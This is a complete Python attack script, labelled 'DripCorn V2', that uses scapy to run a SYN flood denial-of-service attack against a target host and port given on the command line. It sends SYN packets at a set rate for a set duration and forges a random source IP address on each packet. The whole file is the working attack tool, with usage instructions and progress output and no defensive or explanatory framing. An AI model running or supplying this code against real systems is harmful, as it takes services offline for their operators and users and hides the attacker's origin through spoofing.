#!/usr/bin/env python3
"""
DripCorn V2 - SYN Flood Attack
Requires: sudo + scapy
Usage: sudo python3 syn_flood.py <target> <port> <pps> <duration>
"""

import sys
import time
import random
from scapy.all import IP, TCP, send, RandShort

def main():
    if len(sys.argv) != 5:
        print("Usage: sudo python3 syn_flood.py <target> <port> <pps> <duration>")
        sys.exit(1)
    
    target = sys.argv[1]
    port = int(sys.argv[2])
    pps = int(sys.argv[3])
    duration = int(sys.argv[4])
    
    print(f"[+] SYN Flood Attack")
    print(f"[+] Target: {target}:{port}")
    print(f"[+] Rate: {pps} packets/sec")
    print(f"[+] Duration: {duration}s")
    
    sent = 0
    start_time = time.time()
    end_time = start_time + duration
    
    while time.time() < end_time:
        batch_start = time.time()
        
        for i in range(pps // 10):
            # Random source IP
            src_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
            
            # Craft SYN packet
            ip = IP(src=src_ip, dst=target)
            tcp = TCP(sport=RandShort(), dport=port, flags="S", seq=random.randint(1000, 9000))
            packet = ip/tcp
            
            # Send without waiting
            send(packet, verbose=0)
            sent += 1
        
        elapsed = time.time() - batch_start
        if elapsed < 0.1:
            time.sleep(0.1 - elapsed)
        
        if sent % 100 == 0:
            print(f"[{time.strftime('%H:%M:%S')}] Sent: {sent} | RPS: {int(sent / (time.time() - start_time))}")
    
    total_time = time.time() - start_time
    print(f"\n[+] Attack complete")
    print(f"[+] Total packets: {sent}")
    print(f"[+] Avg RPS: {int(sent / total_time)}")

if __name__ == '__main__':
    main()
